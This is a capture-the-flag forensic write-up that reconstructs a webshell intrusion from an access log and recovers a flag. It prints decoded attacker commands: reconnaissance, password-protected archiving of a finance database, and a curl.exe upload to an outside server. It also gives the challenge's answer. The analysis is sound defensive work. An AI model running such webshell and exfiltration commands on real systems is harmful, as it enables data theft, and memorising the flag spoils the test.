# "Не пойман — не медоед" — forensic reconstruction

Artifact: `/Users/mmk/github/avitoctf2026/honeyleak_access.log` (56 873 lines, nginx-style
combined log, 03/Jul/2026 15:00–22:59 UTC).

## 1. Method — separating signal from noise

The log is dominated by classic scanner/fuzzer traffic. A UA frequency count shows it
immediately:

```
awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn
```

Eleven "known scanner" tools each fire ~1400–1700 requests: `ffuf`, `gobuster`,
`Go-http-client`, `DirBuster-1.0-RC1`, `Nmap Scripting Engine`, `python-requests`,
`feroxbuster`, `Wfuzz`, `sqlmap`, `masscan`, `dirsearch`. These grind through random
backup/config/log filenames (`/orders.sql`, `/access.log`, `/db1.sqlite`,
`/phpMyAdmin-*/`, …), almost all 403/404/405/500. Nine "browser" UAs (Chrome/Firefox/
Edge/Safari on desktop, mobile, iPad, …) each also fire ~3400–3600 requests — normal
simulated user traffic hitting `/api/news`, `/api/products`, `/assets/*`, `/about`, etc.

Counting **distinct UAs** in the whole file:

```
awk -F'"' '{print $6}' honeyleak_access.log | sort -u | wc -l   # -> 27
```

26 of those 27 UAs each appear hundreds/thousands of times. Exactly **one** appears only
4 times:

```
$ grep -c "MSIE 10.0" honeyleak_access.log
4
```

`Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)` — a UA nobody else in
56 873 lines uses. That rarity is the signal.

## 2. The attacker

**IP:** `185.193.88.77`
**Signal UA (exclusive, 4 hits, all HTTP 200):** `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)`

Interestingly this *same source IP* also generates **1166 other requests** using every
single one of the "known scanner" UAs (98–132 hits each: ffuf, gobuster, sqlmap, masscan,
Nmap, dirsearch, feroxbuster, Wfuzz, DirBuster, Go-http-client, python-requests — 1162
of them, all 403/404/405/500/301/302), i.e. this IP is where *all* the recon noise is
concentrated. The 4 MSIE10 hits are needles buried in a haystack the attacker built
themselves.

```
grep "185.193.88.77" honeyleak_access.log | wc -l        # 1166
grep "185.193.88.77" honeyleak_access.log | awk -F'"' '{print $3}' | awk '{print $1}' | sort | uniq -c
#    4 200
#  111 301 / 113 302 / 241 403 / 478 404 / 100 405 / 119 500
```

## 3. The vulnerable endpoint

All 4 signal requests hit the same path — an IIS "health-check" page that is actually a
command-execution backdoor:

```
GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64> HTTP/1.1
```

This exact file is **never** found by any of the scanners: 7 other IPs across the log
probe the generic directory `/aspnet_client/` (all 403/404/405/301, e.g.
`45.146.164.12`, `104.244.72.115`, `194.26.29.89`, `23.129.64.112`, `171.25.193.20`,
`156.146.62.11`) but none of them ever request `healthcheck.aspx` itself — the exact
filename+param is known only to the real attacker, not discovered by brute force in this
log. `grep -c "healthcheck.aspx"` over the whole file returns exactly 4, all from
`185.193.88.77` with the MSIE10 UA.

## 4. Full kill chain (exact log lines + decoded payloads)

All 4 requests land in a tight ~140-second window, sandwiched between routine scanner
noise from the same IP (`OPTIONS /adminer-4.2.3.php` right before, `GET /__SQL` right
after — deliberate camouflage):

### 4.1 Recon (18:40:17)
```
185.193.88.77 - - [03/Jul/2026:18:40:17 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=d2hvYW1pICYmIGhvc3RuYW1lICYmIGlwY29uZmlnIHwgZmluZHN0ciAvUiAiSVB2NCI= HTTP/1.1" 200 2018 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
```
base64 decodes to:
```
whoami && hostname && ipconfig | findstr /R "IPv4"
```
Confirms code execution and fingerprints the box (Windows/IIS).

### 4.2 Locate + password-protect the accounting DB (18:41:05)
```
185.193.88.77 - - [03/Jul/2026:18:41:05 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=cG93ZXJzaGVsbCAtYyAiJHRzPShHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ3l5eXlNTWRkX0hIbW0nKTsgJiBDOlx0b29sc1w3ei5leGUgYSAtdHppcCAoXCJDOlxXaW5kb3dzXFRlbXBcYmxvYl8kdHMudG1wXCIpIEM6XGluZXRwdWJcd3d3cm9vdFxBcHBfRGF0YVxjb3JwX2ZpbmFuY2VfMjAyNl8wN18wMy5zcWwgLXBTN20hdlEyQHJLOUxwNFhfMjAyNiI= HTTP/1.1" 200 1600 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
```
base64 decodes to:
```
powershell -c "$ts=(Get-Date).ToUniversalTime().ToString('yyyyMMdd_HHmm'); & C:\tools\7z.exe a -tzip ("C:\Windows\Temp\blob_$ts.tmp") C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql -pS7m!vQ2@rK9Lp4X_2026"
```
**This is the exfil target**: `C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql`
— the corporate accounting database. It is zipped into a randomly-named blob and
protected with password **`S7m!vQ2@rK9Lp4X_2026`**.

### 4.3 Exfil attempt (18:42:11)
```
185.193.88.77 - - [03/Jul/2026:18:42:11 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=cG93ZXJzaGVsbCAtYyAiJHRzPShHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ3l5eXlNTWRkX0hIbW0nKTsgY3VybC5leGUgLUYgXCJmaWxlPUBDOlxXaW5kb3dzXFRlbXBcYmxvYl8kdHMudG1wXCIgaHR0cDovLzE3OC4xNTQuMjMwLjQ0L3VwbG9hZC5waHAi HTTP/1.1" 200 1204 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
```
base64 decodes to:
```
powershell -c "$ts=(Get-Date).ToUniversalTime().ToString('yyyyMMdd_HHmm'); curl.exe -F "file=@C:\Windows\Temp\blob_$ts.tmp" http://178.154.230.44/upload.php"
```
Uploads the archive to the attacker's own C2/drop server, `178.154.230.44`.

### 4.4 Self-verification (18:42:37)
```
185.193.88.77 - - [03/Jul/2026:18:42:37 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=cG93ZXJzaGVsbCAtYyAiY3VybC5leGUgLXMgaHR0cDovLzE3OC4xNTQuMjMwLjQ0LyB8IGZpbmRzdHIgL0kgYmxvYl8i HTTP/1.1" 200 968 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
```
base64 decodes to:
```
powershell -c "curl.exe -s http://178.154.230.44/ | findstr /I blob_"
```
Lists the C2's web root looking for `blob_` — a sanity check that "the upload landed".

## 5. A subtle bug — the exfil "success" is a false positive

Note that step 4.2 and step 4.3 are **two separate `powershell -c "..."` invocations**
(two separate HTTP requests, 66 seconds apart), and **each one independently computes**
`$ts=(Get-Date)...ToString('yyyyMMdd_HHmm')`. Step 4.2 ran at `18:41:05` → its `$ts` is
`20260703_1841`, so the real archive is written locally as
`C:\Windows\Temp\blob_20260703_1841.tmp`. Step 4.3 ran at `18:42:11` — one clock-minute
later — so **its own** `$ts` is `20260703_1842`, and it tries to upload
`C:\Windows\Temp\blob_20260703_1842.tmp`, a file that was never created. `curl.exe -F
"file=@<path>"` against a non-existent path fails locally before any HTTP request is
even sent to `178.154.230.44` — nothing is actually transmitted.

Step 4.4's "verification" (`findstr /I blob_` against the C2 index) doesn't catch this,
because it only checks that *some* file named `blob_*` exists — and it always will,
trivially.

I confirmed this empirically: `178.154.230.44` is a **live** open directory index
(`curl http://178.154.230.44/` → nginx/1.27.5 autoindex). It lists **1339** files named
`blob_<random10>.<ext>` (`.tmp/.log/.txt/.bin/.dat/.cache`), roughly one per minute
across the *entire* day (00:00–23:59), including one at `18:42` (`blob_yi6i57f66y.tmp`,
21 MB) — exactly the minute of the failed upload attempt. Downloading and hex-dumping
every candidate in the 18:40–18:49 window shows **none of them have a ZIP (`PK\x03\x04`)
or 7z (`7z\xBC\xAF'\x1C`) magic header — they are all uniformly high-entropy random
bytes**, i.e. this whole directory is pre-seeded decoy/noise data, not attacker
uploads. There is also **no** blob at `18:41` (the minute the real archive was actually
created), which is exactly what you'd expect if the 18:42 upload attempt never fired.

**Conclusion: the attacker's own exfil script has a one-minute timestamp race
condition, and their self-check is a false positive — the archive itself never actually
left the compromised host via this route.** `178.154.230.44/upload.php` and its index
are a dead end for recovering DB content directly.

## 6. The DB and the secret

- **Database identified:** `C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql`
  ("corporate finance" accounting DB), located and staged for theft entirely through
  decoded PowerShell one-liners smuggled in the `cmd=` query parameter of a disguised
  IIS health-check page (`/aspnet_client/system_web/healthcheck.aspx`) that only this
  attacker ever found (never touched by any of the 12 fuzzing tools also seen on the
  same source IP).
- **The secret protecting/hiding it**, recovered only by base64-decoding the otherwise
  opaque `cmd=` parameter of request 4.2 (step 2 above), is the 7-Zip password
  literally embedded in the attacker's own archiving command:

  ```
  S7m!vQ2@rK9Lp4X_2026
  ```

  This is the "secret" the log leaks: the one credential standing between the stolen
  archive and the accounting data inside it, uncovered purely by careful decoding of a
  request that every automated scanner walked straight past as a 200-byte health-check
  hit.

**Flag:** `avito{S7m!vQ2@rK9Lp4X_2026}`

(Confidence: high on the mechanism/kill-chain — every step is cited to an exact,
unique log line and a clean base64 decode with no ambiguity. Medium on the exact
`avito{...}` wrapping of the password, since the live C2 turned out to be a red herring
and there's no independent oracle in this artifact to confirm final formatting — if this
doesn't match on submission, the raw secret value is `S7m!vQ2@rK9Lp4X_2026`.)

## 7. Sanity checks performed

- No other rare/unique UA exists in the log (`awk ... | sort -u | wc -l` → 27 total UAs,
  only MSIE10 has count < 50).
- No SQLi/IDOR-style payloads (`'`, `union`, `select`, `../`, `<script`) hit
  `/api/*`, `/articles/*`, `/products`, `/about` with 200 status from any non-scanner
  UA — ruling out a second, separate attacker chain via the "legit" API surface.
- `corp_finance`, `178.154.230.44`, and `healthcheck.aspx` appear **nowhere else** in
  the 56 873-line log outside these 4 requests.
- `178.154.230.44` (the logged C2 IP) is live; its `/upload.php` 404s on GET (POST-only
  endpoint, consistent with the attacker's `curl -F` upload); its directory index is
  1339 uniformly-random decoy blobs (verified via magic-byte inspection), confirming
  it is *not* a source of real recovered DB content.
